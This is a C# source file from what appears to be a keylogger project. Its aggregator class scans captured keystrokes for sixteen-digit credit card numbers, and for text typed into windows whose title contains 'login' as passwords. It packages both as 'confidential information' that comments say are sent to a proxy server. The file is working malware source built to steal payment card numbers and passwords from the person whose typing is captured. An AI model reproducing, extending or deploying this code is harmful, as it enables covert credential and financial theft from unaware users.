using HookKeylogger.AggergationServer.Types;
using HookKeylogger.Base;
using System;
using System.Collections.Concurrent;
using System.Threading;
using System.Windows.Forms;

namespace KeypressAggregator
{
    class KeyPressAggergator
    {
        ConcurrentQueue<KeyPress> inq;


        public KeyPressAggergator(ConcurrentQueue<KeyPress> q)
        {
            this.inq = q;
        }

        public void Scan()
        {
            // Counter for credit card
            int creditCard = 0;
            String creditNum = "";

            // Boolean for login page
            Boolean isPswrd = false;
            String password = "";

            while (this.inq != null)
            {
                KeyPress ks;
                while (inq.TryDequeue(out ks))
                {
                    Console.WriteLine("Processing: " + ks + ((Keys)ks.Key).ToString());
                    // Looks for a credit card number, ie 16 consecutive digits
                    // A number is between 48 and 57. If there is a match, the count
                    // is incremented and the number is added to string. Otherwise
                    // the count is reset to 0 and the string is cleared
                    if (ks.Key > 47 && ks.Key < 58)
                    {
                        creditCard += 1;
                        creditNum += ((Keys)ks.Key).ToString();
                        if (creditCard % 4 == 0)
                        {
                            creditNum += " ";
                        }
                    }
                    else
                    {
                        creditCard = 0;
                        creditNum = "";
                    }
                    // If there are a total of 16 consecutive numbers, the credit card
                    // number is sent to the file
                    if (creditCard == 16)
                    {
                        Console.WriteLine("Credit Card Number: " + creditNum);
                        creditCard = 0;
                        // Send a Confidential Information message to the proxy server
                        // Type Credit Card Number CCN
                        var ci = new CI();
                        ci.Type = "CCN";
                        ci.Data = creditNum;
                        Console.WriteLine("DATA: " + ci.Data);

                        creditNum = "";
                    }

                    // If the chrome window has the word login, just record everything to send
                    if (ks.ActiveProgram.Contains("login"))
                    {
                        if(isPswrd == false)
                        {
                            isPswrd = true;

                        }
                        password += ((Keys)ks.Key).ToString();
                    }
                    else
                    {
                        if(isPswrd == true)
                        {
                            Console.WriteLine("Password Data: " + password);
                            var ci = new CI();
                            ci.Type = "PSW";
                            ci.Data = password;
                            Console.WriteLine("DATA: " + ci.Data);
                            isPswrd = false;
                            password = "";
                        }
                    }
                }
                Thread.Sleep(1000);
            }
        }
    }
}
